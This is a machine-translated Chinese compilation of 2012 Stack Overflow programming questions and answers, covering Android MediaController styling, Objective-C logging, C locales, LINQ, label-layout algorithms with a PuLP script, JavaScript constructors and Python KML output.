嗨，有没有办法改变媒体控制器中文本的颜色，显示音频文件的总时间和剩余时间。在 android 2.3 上，时间清晰可见，但当我的应用程序在 android 4.0 或 4.1 上运行时，进度条两侧显示时间的文本太暗。目前我正在扩展 mediacontroller 类以创建我自己的不会消失的媒体控制器，有什么我可以添加到这个类的吗？任何帮助将非常感激。

```
public class WillMediaController extends MediaController {

    public WillMediaController(Context context) {
        super(context);
    }

    @Override
    public void hide() {
        // Do Nothing to show the controller all times

    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent event)
    {
        if (event.getKeyCode() == KeyEvent.KEYCODE_BACK)
        {
            ((Activity) getContext()).finish();

        }else{
            super.dispatchKeyEvent(event);
        }
        if (event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN ||
                event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP) {
            // don't show the controls for volume adjustment
            return super.dispatchKeyEvent(event);
        }
        return true;

    }
} 
```

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-29T12:22:29.513

我有同样的问题。一个好方法是使用主题更改颜色。使用 ContextThemeWrapper 将主题应用到您的 MediaController，例如：

```
private final class AudioMediaController extends MediaController {

    private AudioMediaController(Context context) {
        super(new ContextThemeWrapper(context, R.style.Theme_MusicPlayer));
    }
} 
```

您的主题可能如下所示：

```
<resources>
    <style name="Theme_MusicPlayer">
        <item name="android:textColor">#FFFFFF</item>
    </style>
</resources> 
```

将其作为 XML 文件保存到您的 res/values 文件夹中。媒体控制器中每个文本的颜色（当前时间和结束时间）现在都是白色的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T00:52:56.983

其实有点难。如果您查看 的[源代码`MediaController`](https://android.googlesource.com/platform/frameworks/base/+/refs/heads/master/core/java/android/widget/MediaController.java)`com.android.internal.R.id.time`，您会注意到它使用的视图有一个您无法轻松访问的内部 id（例如）。

不过，您可以尝试使用反射来获取视图实例，然后修改它们的属性。例如，您可以尝试获取对该`mEndTime`字段的引用，然后更改其文本颜色。例如：

```
try {
    Field currentTime = getClass().getDeclaredField("mCurrentTime");
    currentTime.setAccessible(true);
    TextView currentTimeTextView = (TextView) currentTime.get(this);
    currentTimeTextView.setTextColor(Color.RED);
} catch (Exception pokemon) {
} 
```

# objective-c - 执行异步 URL 请求后的 EXC_BAD_ACCESS

> ID：13280615
> 
> 赞同：0
> 
> 时间：2012-11-08T00:23:12.603
> 
> 标签：objective-c, cocoa, nsurlconnection, osx-mountain-lion, xcode4.5

我正在尝试执行异步 URL 请求：

```
 NSURLRequest* request=[NSURLRequest requestWithURL: [NSURL URLWithString: @"http://www.youtube.com/"]];
    NSOperation* operation=[NSOperation new];
    NSOperationQueue* queue=[NSOperationQueue new];
    [operation setCompletionBlock: ^()
     {
     }];
    [queue addOperation: operation];
    [NSURLConnection sendAsynchronousRequest: request queue: queue completionHandler: ^(NSURLResponse* response, NSData* data, NSError* error)
    {
        NSLog(@"%@",[data bytes]);
    }]; 
```

所以我只需要 URL 中包含的数据。但是几秒钟后（可能是在新创建的线程加载数据的时候）应用程序崩溃了：

```
thread 6 : EXC_BAD_ACCESS (code=13, address=0x0) 
```

当我尝试打印数据字节时，确切的点是 NSLog 行中的 objc_msgSend_vtable5。PS：我正在使用ARC。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:27:44.277

问题是该方法`-[NSData bytes]`具有返回类型`void *`（并且是指向原始字节缓冲区的指针），但是您通过尝试使用`%@` [格式说明符](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html)记录返回值将其视为对象。要解决这个问题，只需打印 print`data`而不是`[data bytes]`; 更换你的线路

```
NSLog(@"%@", [data bytes]); 
```

和

```
NSLog(@"%@", data); 
```

# c - 如何在 C 中设置运行时字符集？

> ID：13280620
> 
> 赞同：1
> 
> 时间：2012-11-08T00:23:58.840
> 
> 标签：c, linux, character-encoding

在linux环境下，如何在C编程语言中设置运行时字符集？

例如，我想将其设置为 iso8859-1、utf-8 或 ascii。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T23:30:26.317

所做`printf( "%c", '\xa3')`的总是相同的——它将一个值为 0xA3 (= 163) 的*字节输出到标准输出流。*

然后在屏幕上显示的内容取决于您的终端（例如 xterm 或 Linux 控制台）对看到写入值为 163 的字节的反应。*那是你终端*的字符设置问题，你的C程序没有直接的方式可以影响它。您需要做的是让 C 程序*找出*终端期望的字符集，然后生成匹配的输出。

简单的程序通常可以假设他们的输入所在的字符集也是他们的输出预期所在的字符集，然后他们只是忽略字符集问题并简单地在其输出中重现高位字节，就像它们出现在输入。（Unicode 的 UTF-8 编码是特意设计的，以使这种策略在许多情况下都有效）。

但是，如果不是这种情况（例如，如果您的程序包含带有非英文字母的硬编码字符串），则需要使用语言环境函数来确定您的程序应该生成哪种字符编码，然后确保去做。像 libiconv 这样的库通常可以相对轻松地帮助解决这个问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T00:37:02.130

您需要更具体地说明您的意思。在大多数情况下，C 并没有真正的字符集。它的字符串只是以 null 分隔的字节字符串，不做任何编码或解码。

C 标准库和 POSIX 中有一些函数依赖于当前的语言环境。您可以使用 use[`setlocale`](http://pubs.opengroup.org/onlinepubs/009604499/functions/setlocale.html)设置当前语言环境；它默认为 C 语言环境，其中字符串被视为 ASCII 并根据字节值进行比较。

如果要转换字符集，请使用[`iconv`](http://pubs.opengroup.org/onlinepubs/009695399/functions/iconv.html); 这将允许您将缓冲区从一种编码转换为另一种编码。例如，如果您在内部以 UTF-8 表示您的文本，但想以 ISO-8859-1 打印出来，这就是您将使用的。

**编辑添加**：从对另一个答案的评论中，您问：

> 我将终端的预期字符集设置为“ISO 8859-1”，但是为什么当我调用该函数时`setlocale( LC_CTYPE, NULL );`，它仍然返回`C`？我认为它应该返回`ISO 8859-1`，因为这是终端的预期字符集。

当程序启动时，它的语言环境总是“C”。如果要根据环境变量设置语言环境，则需要调用`setlocale( LC_ALL, "")`or `setlocal( LC_CTYPE, "")`; 也就是说，您需要传入一个空字符串，然后将根据您的环境变量设置语言环境。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T00:30:20.393

请参阅`setlocale(3)`，它设置了程序的当前语言环境。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T00:37:42.953

标准 C 提供了`setlocale()`设置语言环境的功能。LC_CTYPE 的值定义字符类型。有关一些更详细的信息，另请参阅[POSIX](http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap07.html)所说的内容。要找出系统支持的语言环境，请运行

```
locale -a 
```

# java - java - 如何在我的主要方法中测试另一个方法

> ID：13280622
> 
> 赞同：1
> 
> 时间：2012-11-08T00:24:03.350
> 
> 标签：java, count

我正在练习在我的主要功能中测试我的方法（它是计算元音的数量）。我想知道如何在这里实现我的代码？我的代码也有缺陷吗？

```
public class MethodPractice{

    public static void main(String[] args){

        numVowels(howcanitesthere);    //i know this is wrong, just trying smth..

    }

    public static int numVowels(String s){

        String text = ("");
        int count = 0;

        for(int i = 0; i < text.length() ;i ++){
            char c = text.charAt(i);

            if(c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u'){
                count++;
            }
        }
        System.out.println(count);

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:28:25.717

有几种方法：

*   您可以从命令行传递参数，或者
*   你可以传递一堆硬编码的参数，然后检查答案。

这是一个例子：

命令行参数：

```
if (args.length == 1) {
    System.out.println(numVowels(args[0]));
} 
```

硬编码字符串：

```
if (numVowels("hello") == 2) {
    System.out.println("OK");
} else {
    System.out.println("wrong");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:28:53.093

```
System.out.println(numVowels("A test string")); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:52:16.607

```
numVowels("test string"); 
```

...就这样！

但是你必须改变`System.out.println(count);`你`return count;`的功能才能让它工作。否则你会得到一个错误。

一旦你这样做了，试着把它放在你的 main 方法中：

```
System.out.println(numVowels("test string")); 
```

# asp.net-mvc - 如何在linq的where子句中编写if条件

> ID：13280624
> 
> 赞同：1
> 
> 时间：2012-11-08T00:24:04.020
> 
> 标签：asp.net-mvc, linq

我想在 where 子句中写 if 条件。因为如果名字或姓氏为空，我不想将它添加到 where 子句中。否则我想添加它。

所以我写

```
var query1 = from opv in _opvRepository.Table
                         join o in _orderRepository.Table on opv.OrderId equals o.Id
                         join gr in _graduandRepository.Table on opv.graduand_id equals gr.graduand_id
                         join pv in _productVariantRepository.Table on opv.ProductVariantId equals pv.Id
                         join p in _productRepository.Table on pv.ProductId equals p.Id
                         where (opv.ceremony_id == ceremony_id) && 
                         (!o.Deleted) && (opv.IsHireItem == true)  &&
                         (!p.Deleted) &&
                         (!pv.Deleted) && (opv.ceremony_id == ceremony_id)      
                       //  group opv by opv.OrderId into g
                         select new
                         {
                             opvTable = opv,
                             grTable = gr,

                         };

// This is not working. I have problem in here. How to add this??
             if (!String.IsNullOrEmpty(Fname))
                 query1 = query1.Where(grTable = > grTable.first_name == Fname);

            var result = query1.ToList().Select(x =>
            {
                return new HireItemReportLine()
                {
                    OrderId = x.opvTable.OrderId,
                    OrderDate=x.opvTable.Order.CreatedOnUtc,
                    Amount= x.opvTable.Order.OrderSubtotalExclTax,
                    PaymentMethod = x.opvTable.Order.PaymentMethodSystemName,
                    paidDate = x.opvTable.Order.CreatedOnUtc,

                    Fname = x.grTable.first_name,
                    MName = x.grTable.middle_name,
                    LName = x.grTable.last_name,

                };
            }).ToList(); 
```

我的线有什么问题？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:26:38.073

请注意，您的原始查询选择具有两个属性的匿名类型：`opvTable`和`grTable`。因此，您需要在后续`Where`子句中使用这些属性之一，如下所示：

```
 query1 = query1.Where(item => item.grTable.first_name == Fname); 
```

# algorithm - 在图像上布置标签的建议算法/方法

> ID：13280627
> 
> 赞同：27
> 
> 时间：2012-11-08T00:24:25.797
> 
> 标签：algorithm, sorting, dynamic-programming, genetic-algorithm, backtracking

给定一张图像和一组附加到图像上特定点的标签，我正在寻找一种算法来将标签布置在图像的两侧，并具有一定的约束（每侧的标签数量大致相同，标签大致等距，将标签连接到它们各自的点的线，没有线交叉）。

现在，通过按 Y 坐标（它们所指的点）对标签进行排序，通常可以非常天真地找到*近似解，*[如本例所示](http://www.javamex.com/media/LabellingExample.png)（仅用于概念证明，请忽略实际数据的准确性或其他情况！）。

现在为了满足没有交叉的条件，我想到了一些想法：

*   使用遗传算法找到没有交叉的标签排序；
*   使用另一种方法（例如动态规划算法）来搜索这样的排序；
*   使用上述算法之一，允许间距和排序的变化，以找到最小化交叉数量和均匀间距变化的解决方案；
*   也许有一些标准我可以用来在特定标准内对标签的所有可能排序进行粗略搜索（如果两个标签的距离大于 X，则不要重新排序）；
*   如果所有其他方法都失败了，只需尝试数百万个随机排序/间距偏移量，并采用能够提供最小交叉/间距变化的那个。（优点：编程简单，可能会找到一个足够好的解决方案；轻微的缺点，虽然不是一个显示停止器：可能无法在应用程序期间动态运行它以允许用户更改图像的布局/大小。 )

在我开始其中一个之前，我只想欢迎其他人的意见：是否有其他人遇到过类似的问题，并且有任何信息可以报告上述任何方法的成功/失败，或者他们是否有更好的/我没有想到的更简单的解决方案？感谢您的输入！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-08T15:52:07.183

Lucas Bradsheet 的荣誉论文[Labeling Maps using Multi-Objective Evolutionary Algorithms](http://undergraduate.csse.uwa.edu.au/year4/Current/Students/Files/2004/LucasBradstreet/CorrectedDissertation.pdf)对此进行了很好的讨论。

首先，本文为许多标签质量指标创建了可用的指标。

例如，清晰度（站点和标签之间的映射有多明显）：clearance(s)=r [s] +r [s] ^(1/r [t])
其中 r [s]是站点与其标签之间的距离，r [t]是 a 之间的距离网站和最接近的其他标签）。

它还具有用于标签、站点和边界之间的冲突以及测量标签的密度和对称性的有用指标。然后，Bradsheet 使用多目标遗传算法生成可行解的“[帕累托前沿](http://en.wikipedia.org/wiki/Pareto_front)”。它还包括有关他如何使个体变异的信息，以及有关提高算法速度的一些注释。

里面有很多细节，应该提供一些很好的思考。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-17T14:13:03.413

让我们暂时忘记信息设计。这个任务回忆了一些与[PCB 布线算法](http://en.wikipedia.org/wiki/Routing_%28electronic_design_automation%29)相关的记忆。实际上有很多共同的要求，包括：

1.  交叉口优化
2.  尺寸优化
3.  差距优化

因此，可以将初始任务变成类似于 PCB 布线的任务。

有很多可用的信息，但我建议查看[Tan Yan 的关于 PCB 布线的算法研究](https://www.ideals.illinois.edu/bitstream/handle/2142/18367/Yan_Tan.pdf?sequence=1)。

![](../Images/21fa78e4449cc702c7c4fc2d3e032c0f.png)

它提供了很多细节和几十个提示。

**适应当前任务**

这个想法是将图像和标签上的标记视为两组引脚，并使用转义路由来解决任务。通常 PCB 区域表示为一个引脚阵列。可以对图像进行相同的优化，并进行可能的优化：

1.  避免低对比度区域
2.  避免使用文本框（如果有）
3.  ETC

因此，可以将任务简化为“在未使用引脚的情况下进行路由”

![在此处输入图像描述](../Images/ed1845772743fe9bff7eb3128bcb85a6.png)

最终结果可以非常接近请求的样式：

![在此处输入图像描述](../Images/6ae61f407278b55952b63aee67fd71f7.png)

[Tan Yan 对 PCB 布线的算法研究](https://www.ideals.illinois.edu/bitstream/handle/2142/18367/Yan_Tan.pdf?sequence=1)是一个继续的好地方。

**补充笔记**

为了突出相似性，我稍微改变了绘画的风格。

![在此处输入图像描述](../Images/401722efaaa1b958d624cf5a88f9e835.png)

做一些反向转换应该不是什么大问题，保持良好的外观和可读性。

![在此处输入图像描述](../Images/e6bdcbd961161b22795939faa7b73024.png)

无论如何，简单的专家（例如我）可以花几分钟时间发明更好的东西（或不同的东西）：

![在此处输入图像描述](../Images/21b1662c39842755a289e040849d2e66.png)

至于我，曲线看起来不像是一个完整的解决方案，至少在这个阶段是这样。无论如何，我只是试图表明存在改进的空间，因此可以考虑将 PCB 布线方法作为一种选择。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-11-14T08:05:13.567

一种选择是将其转换为整数规划问题。

假设您拥有`n points`并`n corresponding labels`分布在图表的外部。

可能的线数是`n^2`，如果我们查看所有可能的交叉点，则少于`n^4`交叉点（如果显示了所有可能的线）。

在我们的整数规划问题中，我们添加了以下约束：

（决定线路是否开启（即显示到屏幕上））

1.  对于图表上的每个点，连接到它的可能的 n 条线中只有一条要打开。

2.  对于每个标签，连接到它的可能的 n 条线路中只有一条要打开。

3.  对于每一对相交的线段line1和line2，这些线中只有0条或其中一条可以被打开。

4.  可选地，我们可以最小化所有接通线路的总距离。这增强了美感。

当所有这些约束同时成立时，我们有一个解决方案：

![在此处输入图像描述](../Images/70cbcfaedaa7c7e912c1e9105c864a7b.png)

下面的代码为 24 个随机点生成了上图。

一旦你开始获得超过 15 分左右，程序的运行时间就会开始变慢。

我使用了[PULP](http://packages.python.org/PuLP/CaseStudies/a_blending_problem.html)包和它的默认求解器。我使用 PyGame 进行显示。

这是代码：

```
__author__ = 'Robert'

import pygame
pygame.font.init()
import pulp
from random import randint

class Line():
    def __init__(self, p1, p2):
        self.p1 = p1
        self.p2 = p2
        self.length = (p1[0] - p2[0])**2 + (p1[1] - p2[1])**2

    def intersect(self, line2):
        #Copied some equations for wikipedia. Not sure if this is the best way to check intersection.
        x1, y1 = self.p1
        x2, y2 = self.p2
        x3, y3 = line2.p1
        x4, y4 = line2.p2
        xtop = (x1*y2-y1*x2)*(x3-x4)-(x1-x2)*(x3*y4-y3*x4)
        xbottom = (x1-x2)*(y3-y4) - (y1-y2)*(x3-x4)
        ytop = (x1*y2-y1*x2)*(y3-y4)-(y1-y2)*(x3*y4-y3*x4)
        ybottom = xbottom
        if xbottom == 0:
            #lines are parallel. Can only intersect if they are the same line. I'm not checking that however,
            #which means there could be a rare bug that occurs if more than 3 points line up.
            if self.p1 in (line2.p1, line2.p2) or self.p2 in (line2.p1, line2.p2):
                return True
            return False
        x = float(xtop) / xbottom
        y = float(ytop) / ybottom
        if min(x1, x2) <= x <= max(x1, x2) and min(x3, x4) <= x <= max(x3, x4):
            if min(y1, y2) <= y <= max(y1, y2) and min(y3, y4) <= y <= max(y3, y4):
                return True
        return False

def solver(lines):
    #returns best line matching
    lines = list(lines)
    prob = pulp.LpProblem("diagram labelling finder", pulp.LpMinimize)

    label_points = {} #a point at each label
    points = {} #points on the image
    line_variables = {}
    variable_to_line = {}

    for line in lines:
        point, label_point = line.p1, line.p2
        if label_point not in label_points:
            label_points[label_point] = []
        if point not in points:
            points[point] = []
        line_on = pulp.LpVariable("point{0}-point{1}".format(point, label_point),
            lowBound=0, upBound=1, cat=pulp.LpInteger) #variable controls if line used or not
        label_points[label_point].append(line_on)
        points[point].append(line_on)
        line_variables[line] = line_on
        variable_to_line[line_on] = line

    for lines_to_point in points.itervalues():
        prob += sum(lines_to_point) == 1 #1 label to each point..

    for lines_to_label in label_points.itervalues():
        prob += sum(lines_to_label) == 1 #1 point for each label.

    for line1 in lines:
        for line2 in lines:
            if line1 > line2 and line1.intersect(line2):
                line1_on = line_variables[line1]
                line2_on = line_variables[line2]
                prob += line1_on + line2_on  <= 1 #only switch one on.

    #minimize length of switched on lines:
    prob += sum(i.length * line_variables[i] for i in lines)

    prob.solve()
    print prob.solutionTime
    print pulp.LpStatus[prob.status] #should say "Optimal"
    print len(prob.variables())

    for line_on, line in variable_to_line.iteritems():
        if line_on.varValue > 0:
            yield line #yield the lines that are switched on

class Diagram():
    def __init__(self, num_points=20, width=700, height=800, offset=150):
        assert(num_points % 2 == 0) #if even then labels align nicer (-:
        self.background_colour = (255,255,255)
        self.width, self.height = width, height
        self.screen = pygame.display.set_mode((width, height))
        pygame.display.set_caption('Diagram Labeling')
        self.screen.fill(self.background_colour)
        self.offset = offset
        self.points = list(self.get_points(num_points))
        self.num_points = num_points
        self.font_size = min((self.height - 2 * self.offset)//num_points, self.offset//4)

    def get_points(self, n):
        for i in range(n):
            x = randint(self.offset, self.width - self.offset)
            y = randint(self.offset, self.height - self.offset)
            yield (x, y)

    def display_outline(self):
        w, h = self.width, self.height
        o = self.offset
        outline1 = [(o, o), (w - o, o), (w - o, h - o), (o, h - o)]
        pygame.draw.lines(self.screen, (0, 100, 100), True, outline1, 1)
        o = self.offset - self.offset//4
        outline2 = [(o, o), (w - o, o), (w - o, h - o), (o, h - o)]
        pygame.draw.lines(self.screen, (0, 200, 0), True, outline2, 1)

    def display_points(self, color=(100, 100, 0), radius=3):
        for point in self.points:
            pygame.draw.circle(self.screen, color, point, radius, 2)

    def get_label_heights(self):
        for i in range((self.num_points + 1)//2):
            yield self.offset + 2 * i * self.font_size

    def get_label_endpoints(self):
        for y in self.get_label_heights():
            yield (self.offset, y)
            yield (self.width - self.offset, y)

    def get_all_lines(self):
        for point in self.points:
            for end_point in self.get_label_endpoints():
                yield Line(point, end_point)

    def display_label_lines(self, lines):
        for line in lines:
            pygame.draw.line(self.screen, (255, 0, 0), line.p1, line.p2, 1)

    def display_labels(self):
        myfont = pygame.font.SysFont("Comic Sans MS", self.font_size)
        label = myfont.render("label", True, (155, 155, 155))
        for y in self.get_label_heights():
            self.screen.blit(label, (self.offset//4 - 10, y - self.font_size//2))
            pygame.draw.line(self.screen, (255, 0, 0), (self.offset -  self.offset//4, y), (self.offset, y), 1)
        for y in self.get_label_heights():
            self.screen.blit(label, (self.width - 2*self.offset//3, y - self.font_size//2))
            pygame.draw.line(self.screen, (255, 0, 0), (self.width - self.offset + self.offset//4, y), (self.width - self.offset, y), 1)

    def display(self):
        self.display_points()
        self.display_outline()
        self.display_labels()
        #self.display_label_lines(self.get_all_lines())
        self.display_label_lines(solver(self.get_all_lines()))

diagram = Diagram()
diagram.display()

pygame.display.flip()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-11-16T13:09:39.197

我认为这个问题的实际解决方案是在稍微不同的层上。[完全忽略信息设计](http://en.wikipedia.org/wiki/Information_design%20principles)开始解决算法问题似乎不是正确的想法。[这里](http://www.iiid.net/PDFs/3_Image%20Design.pdf)有一个有趣的例子

![](../Images/5675b9a16afa730c97d65f8cc118f1ca.png)

让我们确定一些重要的问题：

1.  如何最好地查看数据？
2.  会迷惑人吗？
3.  它可读吗？
4.  它真的有助于更好地理解图片吗？

顺便说一句，混乱真的很混乱。我们喜欢秩序和可预测性。无需向初始图像引入额外的信息噪声。

![在此处输入图像描述](../Images/101f5806ca8be3164bc16c71930ee7fc.png)

图形消息的可读性由内容及其呈现方式决定。信息的可读性涉及读者理解文本和图片风格的能力。由于额外的“嘈杂”方法，您拥有有趣的算法任务。消除混乱 - 找到更好的解决方案:)

![在此处输入图像描述](../Images/b3a4e9a1621facada8830b8c820f21aa.png)

请注意，这只是一个[PoC](http://en.wikipedia.org/wiki/Proof_of_concept)。这个想法是只使用带有清晰标记的水平线。标签放置简单且确定。可以提出几个类似的想法。

![在此处输入图像描述](../Images/b73121ff3753b899a5becee79c18cc97.png)

使用这种方法，您可以轻松平衡左右标签，避免线条之间的小的垂直间隙，为标签提供最佳垂直密度等。

**编辑**

好的，让我们看看初始过程的外观。

用户故事：作为用户，我希望对重要的图像进行注释，以简化理解并增加其解释价值。

重要假设：

1.  初始图像是用户的主要对象
2.  可读性是必须的

因此，最好的解决方案是有注释但没有注释。（我真的建议花一些时间阅读有关[创造性解决问题的理论](http://en.wikipedia.org/wiki/TRIZ)）。

基本上，用户看到初始图片应该没有障碍，但注释应该在需要时就在那儿。可能会有些混乱，对此感到抱歉。

你认为路口问题是下图背后的唯一问题吗？

![在此处输入图像描述](../Images/ece746d1e5bd8144458ceef449018ce2.png)

请注意，开发方法背后的实际目标是提供两个信息流（图像和注释）并帮助用户尽快理解所有内容。顺便说一句，视觉记忆也很重要。

人类视觉的背后是什么：

1.  选择性注意
2.  熟悉度检测
3.  模式检测

你想至少打破其中一种机制吗？我希望你不要。因为它会使实际结果不是很人性化。

那么什么可以分散我的注意力呢？

1.  奇怪的线条随机分布在图像上（随机的几何对象非常分散注意力）
2.  注释位置和样式不统一
3.  由于图像和注释层的最终合并而产生的奇怪的复杂模式

为什么要考虑我的建议？

1.  它有简单的图案，所以图案检测会让用户停止注意注释，而是看到图片
2.  它具有统一的设计，因此熟悉度检测也可以工作
3.  它不会像其他解决方案那样影响初始图像，因为线条的宽度最小。
4.  线条是水平的，不使用抗锯齿，因此可以节省更多信息并提供干净的结果
5.  最后，它确实大大简化了路由算法。

一些额外的评论：

1.  不要使用随机点来测试你的算法，使用简单但重要的案例。您会看到自动化解决方案有时可能会严重失败。
2.  我不建议按原样使用我提出的方法。有很多可能的增强功能。
3.  我真正建议的是上一层并在元级别上进行多次迭代。

分组可用于处理复杂的情况，Robert King 提到：

![在此处输入图像描述](../Images/08f8159d69ec382dae35f5622be5870a.png)

或者我可以想象一下，某个点位于其默认位置的略上方。但只是一秒钟，因为我不想破坏主要的处理流程并影响其他标记。

![在此处输入图像描述](../Images/c19f62cf5c139f4b489c13a9d7be7495.png)

感谢您的阅读。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-11-16T16:36:15.010

您可以找到图表的中心，然后从中心径向向外的点绘制线。唯一可以交叉的方法是如果两个点位于同一条射线上，在这种情况下，您只需将其中一条线向一侧移动一点，另一条线向另一侧移动一点，如下所示：

![中心线](../Images/79e229596c1a90f88bd8152faca60e5c.png)

仅显示实际零件：

![全部做完](../Images/7115b6f50d8a19b6ed23e5581a535c47.png)

如果有两个或更多点与中心共线，您可以将线稍微移到一边：

![在共线性的情况下](../Images/5af5ed96c38d5ae608e163df35f37e2f.png)

虽然这不会产生非常好的多段线事物，但它非常清楚地标记了图表。此外，为了使其更具视觉吸引力，最好为实际上是对象中心的中心选择一个点，而不仅仅是点集的中心。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-11-13T08:25:50.457

我会在您的原型中再添加一件事 - 在此之后可能会被接受：

遍历每个交叉点并交换标签，重复直到有交叉点。

这个过程是有限的，因为状态的数量是有限的，并且每次交换都会减少所有行长度的总和 - 所以不可能有循环。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-17T15:32:31.567

这个问题可以转换为图形布局。

我建议您查看例如[Graphviz 库](http://www.graphviz.org/)。我没有做过任何实验，但相信通过将要标记的点和标签本身表示为节点，将引线表示为边，你会得到很好的结果。

您必须将标签不应作为“虚拟”节点的区域表示为不重叠。

Graphvis 具有[多种语言的绑定](http://www.graphviz.org/Resources.php)。

即使 Graphviz 没有足够的灵活性来完全满足您的需求，该页面的“理论”部分也提供了可应用于您的问题的能量最小化和弹簧算法的参考。关于图形布局的文献是巨大的。

# windows-runtime - windows8竞赛参加

> ID：13280628
> 
> 赞同：0
> 
> 时间：2012-11-08T00:24:39.090
> 
> 标签：windows-runtime, setfocus

我正在尝试将焦点设置在 TextBox 上，但 Focus() 方法返回 false

```
this.NameTextBox.Focus(FocusState.Programmatic); 
```

但是在[msdn](http://msdn.microsoft.com/en-us/library/windows/apps/hh702161%28v=win.10%29.aspx)中是这样写的：

> 焦点（焦点状态值）
> 
> 返回值：如果焦点设置在控件上，或者焦点已经在控件上，则返回 true。**如果控件不可聚焦，则为 False。**
> 
> 和
> 
> 您通常将 FocusState.Programmatic 作为参数传递，以指示控件通过有意调用 Focus 方法获得焦点。例如，如果单击“编辑”按钮导致将焦点设置在**TextBox**上，请使用 Programmatic 焦点状态。

那么为什么我的命令不起作用？

# java - 如何从 jarfile 中访问图片？即我将使用什么目录字符串？

> ID：13280633
> 
> 赞同：1
> 
> 时间：2012-11-08T00:25:22.880
> 
> 标签：java, eclipse, graphics, embedded-resource

好的，所以这可能是一个真正的初学者问题，但我从来没有真正使用过我`src`文件夹中的图片。我总是将我的图片链接到某个文件夹，例如`C:\\Resource\\Logo.png`. 我截取了我如何处理我的目录的屏幕截图。基本上我试图从`net.mousemaze.Textures.java`to得到`Resource.Font\FontA.png`。

![字体图像的位置](../Images/6db6f61445459f143a53bf7382fc7952.png)

此外，可能值得注意的是，我目前在**fedora 17**上运行。

获取图像的类粘贴在 [http://pastebin.com/KMVac7mg](http://pastebin.com/KMVac7mg)

此外，目录已重新排列（屏幕截图已更新），因此我不必处理返回目录。即便如此，它也不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:27:24.827

如果您查看文档，有一个名为“createImageIcon”的方法可以在 jar 文件中使用：

```
/** Returns an ImageIcon, or null if the path was invalid. */
protected ImageIcon createImageIcon(String path,
                                           String description) {
    java.net.URL imgURL = getClass().getResource(path);
    if (imgURL != null) {
        return new ImageIcon(imgURL, description);
    } else {
        System.err.println("Couldn't find file: " + path);
        return null;
    }
} 
```

看看您是否可以编辑该代码以满足您的目的。

**编辑：**链接：[http ://docs.oracle.com/javase/tutorial/uiswing/components/icon.html](http://docs.oracle.com/javase/tutorial/uiswing/components/icon.html)

# javascript - 使新关键字可选

> ID：13280639
> 
> 赞同：7
> 
> 时间：2012-11-08T00:26:23.660
> 
> 标签：javascript, constructor, new-operator, javascript-objects

假设我想创建以下 API：

```
var api = function(){}

api.prototype = {
  constructor: api,
  method: function() {
    return this;
  }
}; 
```

现在，这将像这样工作：

```
var myApi = new api();
myApi.method(); 
```

但是假设我想让`new`关键字成为可选的，这样就可以了：

```
api().method(); 
```

我会不由自主地做：

```
var api = function() {
  if ( !(this instanceof api) ) {
    return new api();
  }
}; 
```

但我想知道，这会不会很容易被感染，或者使用这种方法是否还有其他危险？我知道 f.ex jQuery 不这样做（他们将构造函数卸载到原型方法），所以我确信有充分的理由不这样做。我只是不认识他们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-11-19T06:54:19.810

在构造函数中返回一个对象。

```
function Car(){
   var obj = Object.create(Car.prototype);
   obj.prop = 1;
   return obj;
}
Car.prototype = {
    method: function (){ }
};

//test
var car1 = Car();
var car2 = new Car(); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-08T00:31:46.567

选择一个或另一个约定。如果您想为 API 句柄使用对象，但不希望人们必须使用`new`，请使用两个函数。`Api()`这是对象的构造函数，这是一个`api()`只返回一个新`Api`实例的常规函数​​。

我认为您的建议没有危险，这似乎毫无意义，我不喜欢一个函数同时做两件事的想法。

# python - 使用 python 创建 kmls 时遇到问题

> ID：13280656
> 
> 赞同：2
> 
> 时间：2012-11-08T00:28:39.117
> 
> 标签：python, kml, simplekml

我正在使用 python 和 simplekml 创建器创建 kml 文件。由于某种原因，它会创建两个 kml 文件，而不会创建第三个。数据对我来说似乎很好。这是代码：

```
times=open("E:\\Python\Copyofresttable.csv","r")
import time
import csv
import simplekml
from time import strftime, localtime
dayoftheweekvariable = strftime("%A", localtime())
print dayoftheweekvariable
kml = simplekml.Kml()

if dayoftheweekvariable == "Monday":
     for line in times:
        a = line.split(',')
        if a[2] == "Monday":
            print a[5]

if dayoftheweekvariable == "Tuesday":
     for line in times:
        a = line.split(',')
        if a[2] == "Tuesday":
            print a[5]

if dayoftheweekvariable == "Wednesday":
    for line in times:
        a = line.split(',')

        if a[1]== "Iron Hill" and a[2] =="Wednesday":
            kml.newpoint(name="Iron Hill", coords=[(-75.605507,39.960504)], description=a[5])
            kml.save("pythonmap.kml")
            print "Creating KML"

        if a[1]== "Side Bar and Resturant" and a[2] =="Wednesday":
            kml.newpoint(name="Side Bar and Resturant", coords=[(-75.604805,39.960591)], description=a[5])
            kml.save("pythonmap.kml")
            print "Creating KML"

